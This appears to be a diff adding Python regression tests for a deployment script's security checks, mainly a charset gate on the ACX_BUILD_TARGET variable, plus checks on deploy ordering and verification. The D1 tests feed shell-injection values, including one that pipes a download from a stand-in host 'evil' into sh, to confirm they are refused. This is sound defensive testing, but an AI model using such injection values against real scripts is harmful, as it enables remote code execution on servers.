@@ -39,14 +39,18 @@ local ``_FROM_RE`` duplicate.
 
 from __future__ import annotations
 
+import os
 import pathlib
 import re
+import subprocess
 import sys
+import textwrap
 
 REPO_ROOT = pathlib.Path(__file__).resolve().parents[1]
 DOCKERFILE = REPO_ROOT / "apps" / "prototype-description-service" / "Dockerfile"
 SCRIPTS_DIR = REPO_ROOT / "apps" / "prototype-description-service" / "scripts"
 OCI_README = REPO_ROOT / "infra" / "oci" / "README.md"
+DEPLOY_SCRIPT = REPO_ROOT / "scripts" / "deploy" / "recognition-service.sh"
 _SERVICE_ROOT = REPO_ROOT / "apps" / "prototype-description-service"
 _TESTS_PARENT = _SERVICE_ROOT  # recognition is importable when service root is on path
 
@@ -271,6 +275,194 @@ def test_effective_body_accepts_scripts_copy_from_runtime_base(
     own = dockerfile_stages(df)[DEFAULT_RUNTIME_STAGE]
     assert not COPY_SCRIPTS.search(own)
     assert main([str(df)]) == 0
+
+
+# ---- ORCH-LAUNCH-01 wave-4 lane B: deploy-script security (D1) ------------
+
+
+def _assert_safe_shell_token_body() -> str:
+    """Extract assert_safe_shell_token from the deploy script."""
+    script = DEPLOY_SCRIPT.read_text(encoding="utf-8")
+    m = re.search(
+        r"assert_safe_shell_token\(\)\s*\{(?P<body>.*?)\n\}",
+        script,
+        re.DOTALL,
+    )
+    assert m, "assert_safe_shell_token must exist (D1 charset gate)"
+    return m.group("body")
+
+
+def _probe_build_target(target: str) -> subprocess.CompletedProcess[str]:
+    """Run the real charset gate against ACX_BUILD_TARGET (no full deploy script)."""
+    body = _assert_safe_shell_token_body()
+    probe = textwrap.dedent(
+        f"""\
+        #!/usr/bin/env bash
+        set -euo pipefail
+        fail() {{ printf '%s\\n' "$*" >&2; exit 1; }}
+        assert_safe_shell_token() {{
+        {body}
+        }}
+        ACX_BUILD_TARGET={target!r}
+        assert_safe_shell_token "ACX_BUILD_TARGET" "${{ACX_BUILD_TARGET}}"
+        echo ACCEPTED
+        """
+    )
+    return subprocess.run(
+        ["bash", "-c", probe],
+        check=False,
+        capture_output=True,
+        text=True,
+    )
+
+
+def test_d1_acx_build_target_charset_gate_exists() -> None:
+    """D1 structural: charset allowlist + ingestion-time validation present."""
+    script = DEPLOY_SCRIPT.read_text(encoding="utf-8")
+    assert "assert_safe_shell_token" in script
+    assert re.search(r"\[A-Za-z0-9_\.\-\]\+", script)
+    assert "assert_safe_shell_token \"ACX_BUILD_TARGET\"" in script
+    assert "assert_safe_image_repo" in script
+
+
+def test_d1_rejects_metacharacter_build_target() -> None:
+    """D1 / TEST-15: shell metacharacters in ACX_BUILD_TARGET must be refused.
+
+    Proven RED against the pre-fix script (no assert_safe_shell_token; evil
+    value flowed into resolve_image_repo_name → ACX_IMAGE_REPO → single-quoted
+    ssh fragment in ship_remote_image_repo_env and executed on the VM).
+    """
+    evil_values = [
+        "x';curl evil|sh;'",
+        "runtime-vlm;id",
+        "foo$(whoami)",
+        "bar`id`",
+        "baz|tee",
+        "qux&bg",
+        "a b",
+        "a\nb",
+    ]
+    for target in evil_values:
+        result = _probe_build_target(target)
+        assert result.returncode != 0, (
+            f"D1: expected refuse for metachar target {target!r}, got ACCEPTED: "
+            f"stdout={result.stdout!r} stderr={result.stderr!r}"
+        )
+        combined = (result.stdout or "") + (result.stderr or "")
+        assert "charset" in combined.lower() or "refusing" in combined.lower(), (
+            f"error must name charset refusal for {target!r}: {combined}"
+        )
+
+    # Legitimate targets still accepted.
+    for target in ("", "runtime", "runtime-vlm", "builder", "foo_bar.1-2"):
+        result = _probe_build_target(target)
+        assert result.returncode == 0, (
+            f"legitimate target {target!r} must pass: {result.stderr}"
+        )
+        assert "ACCEPTED" in (result.stdout or "")
+
+
+def test_d1_full_script_refuses_evil_build_target_at_ingestion() -> None:
+    """Sourcing/executing the deploy script with an evil ACX_BUILD_TARGET exits."""
+    evil = "x';curl evil|sh;'"
+    env = os.environ.copy()
+    env["ACX_BUILD_TARGET"] = evil
+    proc = subprocess.run(
+        ["bash", str(DEPLOY_SCRIPT), "help"],
+        check=False,
+        capture_output=True,
+        text=True,
+        env=env,
+        timeout=15,
+    )
+    assert proc.returncode != 0, (
+        f"deploy script must refuse evil ACX_BUILD_TARGET at ingestion; "
+        f"stdout={proc.stdout!r} stderr={proc.stderr!r}"
+    )
+    combined = (proc.stdout or "") + (proc.stderr or "")
+    assert "charset" in combined.lower() or "refusing" in combined.lower()
+
+
+def test_d8_variant_vlm_without_vlm_target_fails_closed() -> None:
+    """D8 build-half: ACX_IMAGE_VARIANT=vlm + non-*vlm* target is refused."""
+    script = DEPLOY_SCRIPT.read_text(encoding="utf-8")
+    assert "ACX_IMAGE_VARIANT=vlm requires ACX_BUILD_TARGET matching *vlm*" in script
+    env = os.environ.copy()
+    env["ACX_IMAGE_VARIANT"] = "vlm"
+    env["ACX_BUILD_TARGET"] = "runtime"
+    proc = subprocess.run(
+        ["bash", str(DEPLOY_SCRIPT), "help"],
+        check=False,
+        capture_output=True,
+        text=True,
+        env=env,
+        timeout=15,
+    )
+    assert proc.returncode != 0
+    combined = (proc.stdout or "") + (proc.stderr or "")
+    assert "ACX_IMAGE_VARIANT=vlm" in combined
+
+
+def test_d4_boot_smoke_uses_real_entrypoint_and_cache_mount() -> None:
+    """D4: Gate 2 must run image CMD (not uvicorn override) with /data/cache mount."""
+    script = DEPLOY_SCRIPT.read_text(encoding="utf-8")
+    # Tag promotion after smoke remains required.
+    deploy_body = script.split("do_deploy()", 1)[1].split("do_promote()", 1)[0]
+    assert deploy_body.index("do_push_sha") < deploy_body.index("promote_gate") < deploy_body.index(
+        "do_push_tag"
+    )
+    smoke = script.split("do_boot_smoke()", 1)[1].split("\ndo_restart()", 1)[0]
+    assert "--entrypoint sh" not in smoke or "uvicorn api.main:app" not in smoke
+    assert "/data/cache:ro" in smoke
+    assert "RECOGNITION_BLOB_ROOT" in smoke
+    assert "ACX_MODELS_PATH" in smoke
+
+
+def test_d6_ship_remote_uses_sudo_and_trailing_newline() -> None:
+    """D6: ship_remote_image_repo_env must sudo and guard trailing newline."""
+    script = DEPLOY_SCRIPT.read_text(encoding="utf-8")
+    m = re.search(
+        r"ship_remote_image_repo_env\(\)\s*\{(?P<body>.*?)\n\}",
+        script,
+        re.DOTALL,
+    )
+    assert m, "ship_remote_image_repo_env missing"
+    body = m.group("body")
+    assert "sudo" in body
+    assert "tail -c1" in body or "trailing" in body.lower() or "tee -a" in body
+    # Ship before tag promotion (in promote_gate).
+    gate = script.split("promote_gate()", 1)[1].split("\nenv_to_compose_files", 1)[0]
+    assert "ship_remote_image_repo_env" in gate
+    assert gate.index("do_boot_smoke") < gate.index("ship_remote_image_repo_env")
+
+
+def test_d9_clear_image_repo_subcommand_documented() -> None:
+    """D9: sticky ACX_IMAGE_REPO removal path exists and is documented."""
+    script = DEPLOY_SCRIPT.read_text(encoding="utf-8")
+    assert "clear-image-repo" in script
+    assert "clear_remote_image_repo_env" in script
+    assert "Sticky ACX_IMAGE_REPO" in script or "clear-image-repo" in script.split(
+        "Image variants", 1
+    )[1][:2000]
+
+
+def test_d10_verify_returns_not_exits_on_image_mismatch() -> None:
+    """D10: verify_running_image_matches_deployed must return 1, not fail/exit."""
+    script = DEPLOY_SCRIPT.read_text(encoding="utf-8")
+    m = re.search(
+        r"verify_running_image_matches_deployed\(\)\s*\{(?P<body>.*?)\n\}",
+        script,
+        re.DOTALL,
+    )
+    assert m, "verify_running_image_matches_deployed missing"
+    body = m.group("body")
+    assert "return 1" in body
+    # fail() would defeat ACX_VERIFY_OPTIONAL when used under `if ! do_verify`.
+    assert not re.search(r"^\s*fail\s+", body, re.MULTILINE), (
+        "verify_running_image_matches_deployed must not call fail() (exits the shell)"
+    )
+    assert "read_remote_image_repo" in script
+    assert "if ! verify_running_image_matches_deployed" in script
 
 
 if __name__ == "__main__":
